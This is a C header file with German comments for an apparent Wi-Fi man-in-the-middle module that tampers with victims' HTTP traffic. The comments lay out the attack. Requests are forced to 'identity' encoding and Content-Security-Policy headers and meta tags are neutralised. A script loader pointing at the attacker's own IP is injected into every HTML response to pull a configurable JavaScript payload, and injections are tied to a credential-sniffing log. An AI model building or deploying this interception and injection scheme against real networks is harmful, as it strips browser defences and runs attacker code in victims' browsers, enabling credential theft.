#pragma once

#include <stdbool.h>
#include <stdint.h>

#ifdef __cplusplus
extern "C" {
#endif

/** HTML-Inject aktivieren/deaktivieren. */
void wlan_html_inject_set_armed(bool armed);
bool wlan_html_inject_armed(void);

/** User-Payload setzen — rohes JS (kein <script>-Wrapper nötig). Wird beim
 *  HTTP-GET /code an den Browser ausgeliefert. Der eigentliche Inject in jedes
 *  HTML-Response-Paket ist dagegen ein winziger Loader
 *    <script src="//<MY_IP>/code"></script>
 *  der den hier gesetzten Code dann in der Browser-Sandbox holt. Damit passt
 *  der Inject auch bei beengten <body>-Slots, und der eigentliche Payload
 *  darf beliebig groß werden (max 1023 Bytes).
 *
 *  Im Payload können Template-Variablen stehen, die der /code-Endpoint pro
 *  Request rendert:
 *    %%MY_IP%%      — eigene IP des MiTM
 *    %%VICTIM_IP%%  — IP des Browsers, der /code abruft */
void wlan_html_inject_set_code(const char* code);

/** Liest den aktuell gesetzten User-Payload in `out` (NICHT NUL-terminiert).
 *  Kopiert max(actual_len, max_len) Bytes; Rückgabe ist die geschriebene Länge.
 *  Vom mitm-server /code-Handler aufgerufen. */
uint32_t wlan_html_inject_get_payload(char* out, uint32_t max_len);

/** Eigene IP für die %%MY_IP%%-Variable setzen (host byte order = wie
 *  wlan_hal_get_own_ip() liefert). Sollte in der Run-Scene beim Arm gesetzt
 *  werden, bevor der Hook scharf wird. */
void wlan_html_inject_set_my_ip(uint32_t ip);

/** Optionalen Cred-Sniff-Ring anhängen — beim INJECT-Erfolg wird ein
 *  "INJ"-Eintrag in dessen Ring gepusht (mit URL-Lookup über das
 *  Per-Flow-Tracking im cred_sniff). NULL deaktiviert das Logging. */
struct WlanCredSniff;
void wlan_html_inject_set_cred_sniff(struct WlanCredSniff* cs);

/** In-place-Modifikation eines vollständigen Ethernet-Frames (IPv4 + TCP).
 *
 *  Outbound HTTP-Request (dport 80/8080/8000): "Accept-Encoding"-Header
 *  length-preserving auf "identity" setzen.
 *
 *  Inbound HTTP-Response (sport 80/8080/8000):
 *    1. Jedes Vorkommen von "Content-Security-Policy[-Report-Only]" im Frame
 *       length-preserving in einen X-Header umbenennen (deckt sowohl den
 *       Response-Header als auch <meta http-equiv="Content-Security-Policy"
 *       im HTML-Body ab).
 *    2. Falls die *vollständige* HTTP-Response (Headers + Body) in diesem
 *       Paket steckt (Content-Length <= Body-Bytes-im-Paket) und ein <body>-
 *       Tag gefunden wird, direkt nach dem öffnenden <body...>-Tag
 *       <script>alert(1234);</script> einsetzen (Frame wächst um 29 Bytes)
 *       und Content-Length entsprechend hochzählen. Bei Multi-Segment-
 *       Responses wird der Inject übersprungen (sonst würden die TCP-
 *       Seq-Nummern für die Folge-Pakete brechen).
 *
 *  Beim Inject muss der Aufrufer-Buffer ausreichend Headroom haben
 *  (mind. *len + 29 Bytes). buf_size = Gesamtkapazität des Buffers.
 *  *len wird ggf. nach oben aktualisiert. IP-Total-Length, IP-Header-Checksum
 *  und TCP-Checksum werden bei jeder Modifikation neu berechnet.
 *
 *  @return true wenn modifiziert (Statistik-Zwecke). */
bool wlan_html_inject_process_eth(uint8_t* eth, uint16_t* len, uint16_t buf_size);

uint32_t wlan_html_inject_count_injected(void);
uint32_t wlan_html_inject_count_stripped(void);

#ifdef __cplusplus
}
#endif
